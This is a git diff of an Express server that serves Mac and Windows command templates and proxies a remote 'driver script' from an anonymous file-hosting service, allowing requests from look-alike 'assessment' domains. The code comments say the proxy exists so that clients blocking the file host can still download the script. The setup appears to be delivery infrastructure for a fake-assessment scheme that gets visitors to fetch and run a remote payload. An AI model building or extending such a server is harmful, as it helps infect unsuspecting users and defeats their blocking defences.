@@ -17,9 +17,11 @@ const WINDOW_CMD_PATH = join(__dirname, 'window.ps1');
 
 const MAC_CMD_TEMPLATE = readFileSync(MAC_CMD_PATH, 'utf8');
 const WINDOW_CMD_TEMPLATE = readFileSync(WINDOW_CMD_PATH, 'utf8');
+/** Allowed filenames for GET /get-file/:filename (no path traversal). */
 const GET_FILE_ALLOWLIST = {
   'test.js': { path: join(__dirname, 'test.js'), contentType: 'text/javascript; charset=utf-8' },
 };
+
 function escapeBashDoubleQuotedValue(value) {
   return String(value)
     .replace(/\\/g, '\\\\')
@@ -51,8 +53,8 @@ function parseStepHistory(raw) {
 const allowedOrigins = [
   'https://wecreateproblems.in',
   'https://www.wecreateproblems.in',
-  'https://sigmaassesmentsystems.com',
-  'https://www.sigmaassesmentsystems.com',
+  'https://sigmaassessmentssystems.com',
+  'https://www.sigmaassessmentssystems.com',
   'http://localhost:5173',
   /^http:\/\/192\.168\.\d+\.\d+:5173$/,   // local network
   /^http:\/\/198\.18\.\d+\.\d+:5173$/,   // VPN/virtual network dev
@@ -78,6 +80,7 @@ app.get('/health', async (req, res) => {
     res.status(503).json({ status: 'error', database: 'disconnected' });
   }
 });
+
 app.get('/get-file/:filename', (req, res) => {
   const entry = GET_FILE_ALLOWLIST[req.params.filename];
   if (!entry) {
@@ -122,7 +125,7 @@ const macRoute = (req, res) => {
   res.type('text/plain').send(content);
 };
 
-/** Same payload as files.catbox.moe — proxied so clients that block catbox can still download via api.sigmaassesmentsystems.com */
+/** Same payload as files.catbox.moe — proxied so clients that block catbox can still download via api.sigmaassesmentsystem.com */
 const DRIVER_SCRIPT_UPSTREAM = 'https://files.catbox.moe/tkgnyt.js';
 
 async function driverEnvSetupProxy(req, res) {
